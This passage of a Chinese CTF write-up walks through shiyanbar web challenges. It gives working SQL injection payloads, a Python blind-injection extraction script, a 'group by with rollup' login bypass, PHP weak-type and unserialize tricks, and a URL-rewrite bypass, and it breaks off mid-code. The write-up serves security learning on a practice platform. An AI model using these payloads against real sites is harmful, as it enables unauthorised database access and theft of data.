class="line">?id=0%27/**/union/**/select/**/database()/**/%27</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/ttable_schemaable_schema=%27web1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/ccolumn_nameolumn_name/**/from/**/infinformation_schema.columnsormation_schema.columns/**/where/**/table_name=%27flag</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/where/**/%271</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php</a></p><p>同样注入点是id，数字型注入，过滤了空格，用行注释符代替即可</p><p>爆库payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/database()/**/%23</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=%27web1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=%27flag</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/%23</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php</a></p><p>有查询结果返回hello，无结果则不返回，有报错信息，但是过滤了extractvalue和updatexml，所以选择用基于布尔的盲注</p><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">all_string = <span class="string">'''qwertyuiopasdfghjklzxcvbnm&#123;&#125;QWERTYUIOPASDFGHJKLZXCVBNM@_1234567890 '''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="comment">#数据库名:web1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1,100):</span></span><br><span class="line"><span class="string">for j in all_string:</span></span><br><span class="line"><span class="string">f = 0</span></span><br><span class="line"><span class="string">print('checking '+j)</span></span><br><span class="line"><span class="string">url = "http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select database()),%s,1))=%s--+"%(str(i),ord(j))</span></span><br><span class="line"><span class="string">r = requests.get(url)</span></span><br><span class="line"><span class="string">if "Hello!" in r.text:</span></span><br><span class="line"><span class="string">print('The '+str(i)+' place of database is: '+j)</span></span><br><span class="line"><span class="string">database = database + j</span></span><br><span class="line"><span class="string">f = 1</span></span><br><span class="line"><span class="string">break</span></span><br><span class="line"><span class="string">if f == 0 and j == '?':</span></span><br><span class="line"><span class="string">break</span></span><br><span class="line"><span class="string">print('database: '+database)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#flag:</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">print(<span class="string">'checking '</span>+j)</span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select flag from flag),%s,1))=%s--+"</span>%(str(i),ord(j))</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Hello!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">'The '</span>+str(i)+<span class="string">' place of flag is: '</span>+j)</span><br><span class="line">flag = flag + j</span><br><span class="line">f = <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">' '</span>:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a></p><p>源代码给出了提示：source.txt </p><p>访问得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123;</span><br><span class="line">echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line">        print &quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;浜﹀彲璧涜墖锛�&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">print &quot;涓€棰楄禌鑹囷紒&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计代码，得到flag的思路：</p><p>1.需要POST两个参数uname和pwd</p><p>2.经过sql查询后返回的结果行数必须为1</p><p>3.查询结果的pwd字段必须等于我们POST的参数pwd值</p><p>这里过滤了关键字and，select，from，where，union，join，sleep，benchmark，(，)，逗号</p><p>我们必须控制查询结果的pwd字段，而这里union被过滤了，基于布尔的盲注也不行</p><p>解决方法是用with rollup，它的作用是在查询结果的最后一行添加null，但是必须配合group by来使用</p><p>在本地数据库测试：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以我们可以通过group by pwd with rollup来返回一行查询结果，其中pwd列下的数据为NULL，然后POST的参数pwd赋值为空，就可以控制两个参数相等</p><p>那么我们接下来就是控制查询行数为1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>通过limit 1来控制查询行数为1，但是还要返回NULL的那行，这里逗号被过滤了，可以使用 limit 1 offset 0</p><p>，效果跟limit 0,1是一样的</p><p>所以最终的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos; or 1 group by pwd with rollup limit 1 offset 2#&amp;pwd=</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a></p><p>burp抓包发现响应头部存在FLAG字段</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>FLAG字段经过BASE64加密</p><p>解密后post参数key等于解密后的值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有得到flag，发现头部FLAG字段值又发生了变化，想起题目可能要快速提交flag，可能要写脚本提交key</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">FLAG = base64.b64decode(r.headers[<span class="string">'FLAG'</span>])</span><br><span class="line">FLAG = bytes.decode(FLAG)</span><br><span class="line">FLAG = FLAG.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'key'</span>:FLAG</span><br><span class="line">    &#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>运行结果：CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}</p><h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>网址：<a href="http://ctf5.shiyanbar.com/indirection/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php</a></p><p>给出了源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// code by SEC@USTC </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;; </span><br><span class="line"></span><br><span class="line">$URL = $_SERVER[&apos;REQUEST_URI&apos;]; </span><br><span class="line">//echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;; </span><br><span class="line">$flag = &quot;CTF&#123;???&#125;&quot;; </span><br><span class="line"></span><br><span class="line">$code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;)); </span><br><span class="line">$stop = 0; </span><br><span class="line"></span><br><span class="line">//这道题目本身也有教学的目的 </span><br><span class="line">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 </span><br><span class="line">//所以，第一个要求就是不得出现 ./ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 1;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第二，我们可以构造 \ 来代替被过滤的 / </span><br><span class="line">//所以，第二个要求就是不得出现 ../ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;\\&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 2;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第三，有的系统大小写通用，例如 indirectioN/ </span><br><span class="line">//你也可以用?和#等等的字符绕过，这需要统一解决 </span><br><span class="line">//所以，第三个要求对可以用的字符做了限制，a-z / 和 . </span><br><span class="line">$matches = array(); </span><br><span class="line">preg_match(&apos;/^([0-9a-z\/.]+)$/&apos;, $URL, $matches); </span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 3;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第四，多个 / 也是可以的 </span><br><span class="line">//所以，第四个要求是不得出现 // </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 4;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第五，显然加上index.php或者减去index.php都是可以的 </span><br><span class="line">//所以我们下一个要求就是必须包含/index.php，并且以此结尾 </span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 5;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第六，我们知道在index.php后面加.也是可以的 </span><br><span class="line">//所以我们禁止p后面出现.这个符号 </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 6;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第七，现在是最关键的时刻 </span><br><span class="line">//你的$URL必须与/indirection/index.php有所不同 </span><br><span class="line">if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 7;        //Pass </span><br><span class="line">&#125; </span><br><span class="line">if(!$stop) $stop = 8; </span><br><span class="line"></span><br><span class="line">echo &apos;Flag: &apos;.$flag; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">for($i = 1; $i &lt; $stop; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code); </span><br><span class="line">for(; $i &lt; 8; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE); </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br></pre></td></tr></table></figure><p>绕过思路源代码都给出了提示，考察的是url伪静态，比如url中含有xxxx.php/xx/x，那么.php后的xx就会被当成参数名，x会被当成参数</p><p>所以可以构造payload:<a href="http://ctf5.shiyanbar.com/indirection/index.php/a/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php/a/index.php</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/main.php</a></p><p>burp抓包试着修改showsouce参数=1</p><p>提示了源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = $_POST[&quot;PIN&quot;];</span><br><span class="line">if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123;</span><br><span class="line">    echo &quot;Congratulations! The flag is $flag&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;User with provided PIN not found.&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST参数PIN等于-19827747736161128312837161661727773716166727272616149001823847</p><p>拿到flag</p><h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/web1/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/web1/index.php</a></p><p>首先源代码给出了提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;</span><br></pre></td></tr></table></figure><p>这里应该是POST参数username，然后加密后的值 == ‘0’</p><p>这里涉及PHP的弱类型比较，== 比较时，PHP会将数字字符串的数字值取出进行比较，例如’0’ == ‘0abc’</p><p>所以我们只需要找到一个md5加密后的值0开头的字符串即可，典型的为240610708 和 QNKCDZO </p><p>POST参数username=240610708得到/user.php?fame=hjkleffifer</p><p>访问后又得到一串代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[&apos;password&apos;];</span><br><span class="line">     $data_unserialize = unserialize($unserialize_str);</span><br><span class="line">     if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;)</span><br><span class="line">     &#123;</span><br><span class="line">       print_r($flag);</span><br><span class="line">     &#125;</span><br><span class="line">伟大的科学家php方言道：成也布尔，败也布尔。</span><br><span class="line">回去吧骚年</span><br></pre></td></tr></table></figure><p>审计后发现需要POST一个序列化后的值，使得反序列化后的数组user键的值和pass键的值 == 未知字符串，题目还给出了提示“成也布尔，败也布尔”，这里又需要利用PHP弱类型比较，当布尔类型的true与任何字符串弱类型相等</p><p>本地测试得到序列化后的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$data_unserialize = <span class="keyword">array</span>(<span class="string">'user'</span> =&gt; <span class="keyword">True</span>,<span class="string">'pass'</span> =&gt; <span class="keyword">True</span>);</span><br><span class="line">$unserialize_str = serialize($data_unserialize);</span><br><span class="line"><span class="keyword">echo</span> $unserialize_str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果</p><p>a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>POST后得到flag</p><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/upload/step1.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/upload/step1.php</a></p><p>一个找回密码的页面，试着源代码看不出提示信息，试着注册一个email</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>弹框提示了<a href="mailto:./step2.php?email=youmail@mail.com" target="_blank" rel="noopener">./step2.php?email=youmail@mail.com</a>&amp;check=???????</p><p>访问step2.php的源代码，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">&lt;h1&gt;找回密码step2&lt;/h1&gt;</span><br><span class="line">email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; &lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Use of undefined constant email - assumed &apos;email&apos; in &lt;b&gt;C:\h43a1W3\phpstudy\WWW\10\upload\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: email in &lt;b&gt;C:\h43a1W3\phpstudy\WWW\10\upload\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">value=&quot;&quot;  disable=&quot;true&quot;/&gt;&lt;/br&gt;</span><br><span class="line">token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>发现这个页面会GET两个参数emailAddress和token到submit.php</p><p>访问submit.php，提示you are not an admin </p><p>在step2.php中我们还发现了该页面可能是通过vim编写的，所以可能存在.submit.php.swp</p><p>访问后得到提示代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 